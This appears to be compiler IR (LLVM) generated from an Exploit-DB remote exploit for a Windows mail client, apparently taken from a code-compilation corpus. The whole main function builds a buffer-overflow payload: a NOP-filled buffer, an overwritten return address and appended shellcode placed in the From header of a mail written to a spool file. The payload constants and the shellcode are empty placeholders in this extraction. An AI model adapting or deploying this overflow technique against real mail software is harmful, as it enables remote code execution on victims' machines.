; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19621.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19621.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAXBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [21 x i8] c"usage: %s mailspool\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"Can not write to %s\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@EIP = common dso_local global i32 0, align 4
@RETADR = common dso_local global i32 0, align 4
@exploit_code = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@HD1 = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [36 x i8] c"From: %s <exploit@sample.code.net>\0A\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"To: you@your.host.net\0A\00", align 1
@.str.6 = private unnamed_addr constant [28 x i8] c"Subject: subscribe exploit\0A\00", align 1
@HD2 = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %9 = load i32, i32* @MAXBUF, align 4
  %10 = zext i32 %9 to i64
  %11 = call i8* @llvm.stacksave()
  store i8* %11, i8** %6, align 8
  %12 = alloca i8, i64 %10, align 16
  store i64 %10, i64* %7, align 8
  %13 = load i32, i32* %3, align 4
  %14 = icmp ne i32 %13, 2
  br i1 %14, label %15, label %21

15:                                               ; preds = %2
  %16 = load i8**, i8*** %4, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0), i8* %18)
  %20 = call i32 @exit(i32 1) #4
  unreachable

21:                                               ; preds = %2
  %22 = load i8**, i8*** %4, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = call i32* @fopen(i8* %24, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %25, i32** %5, align 8
  %26 = icmp eq i32* %25, null
  br i1 %26, label %27, label %33

27:                                               ; preds = %21
  %28 = load i8**, i8*** %4, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i8* %30)
  %32 = call i32 @exit(i32 1) #4
  unreachable

33:                                               ; preds = %21
  %34 = load i32, i32* @NOP, align 4
  %35 = load i32, i32* @MAXBUF, align 4
  %36 = call i32 @memset(i8* %12, i32 %34, i32 %35)
  %37 = load i32, i32* @MAXBUF, align 4
  %38 = sub nsw i32 %37, 1
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %12, i64 %39
  store i8 0, i8* %40, align 1
  %41 = load i32, i32* @EIP, align 4
  store i32 %41, i32* %8, align 4
  %42 = load i32, i32* @RETADR, align 4
  %43 = sub nsw i32 %42, 1
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %12, i64 %44
  store i8 -96, i8* %45, align 1
  %46 = load i32, i32* %8, align 4
  %47 = and i32 %46, 255
  %48 = trunc i32 %47 to i8
  %49 = load i32, i32* @RETADR, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %12, i64 %50
  store i8 %48, i8* %51, align 1
  %52 = load i32, i32* %8, align 4
  %53 = lshr i32 %52, 8
  %54 = and i32 %53, 255
  %55 = trunc i32 %54 to i8
  %56 = load i32, i32* @RETADR, align 4
  %57 = add nsw i32 %56, 1
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %12, i64 %58
  store i8 %55, i8* %59, align 1
  %60 = load i32, i32* %8, align 4
  %61 = lshr i32 %60, 16
  %62 = and i32 %61, 255
  %63 = trunc i32 %62 to i8
  %64 = load i32, i32* @RETADR, align 4
  %65 = add nsw i32 %64, 2
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %12, i64 %66
  store i8 %63, i8* %67, align 1
  %68 = load i32, i32* %8, align 4
  %69 = lshr i32 %68, 24
  %70 = and i32 %69, 255
  %71 = trunc i32 %70 to i8
  %72 = load i32, i32* @RETADR, align 4
  %73 = add nsw i32 %72, 3
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8, i8* %12, i64 %74
  store i8 %71, i8* %75, align 1
  %76 = load i32, i32* @RETADR, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %12, i64 %77
  %79 = getelementptr inbounds i8, i8* %78, i64 40
  %80 = load i32, i32* @exploit_code, align 4
  %81 = load i32, i32* @exploit_code, align 4
  %82 = call i32 @strlen(i32 %81)
  %83 = call i32 @strncpy(i8* %79, i32 %80, i32 %82)
  %84 = load i32*, i32** %5, align 8
  %85 = load i8*, i8** @HD1, align 8
  %86 = call i32 (i32*, i8*, ...) @fprintf(i32* %84, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %85)
  %87 = load i32*, i32** %5, align 8
  %88 = call i32 (i32*, i8*, ...) @fprintf(i32* %87, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.4, i64 0, i64 0), i8* %12)
  %89 = load i32*, i32** %5, align 8
  %90 = call i32 (i32*, i8*, ...) @fprintf(i32* %89, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  %91 = load i32*, i32** %5, align 8
  %92 = call i32 (i32*, i8*, ...) @fprintf(i32* %91, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.6, i64 0, i64 0))
  %93 = load i32*, i32** %5, align 8
  %94 = load i8*, i8** @HD2, align 8
  %95 = call i32 (i32*, i8*, ...) @fprintf(i32* %93, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %94)
  %96 = load i32*, i32** %5, align 8
  %97 = call i32 @fclose(i32* %96)
  %98 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %98)
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strncpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @fprintf(i32*, i8*, ...) #2

declare dso_local i32 @fclose(i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
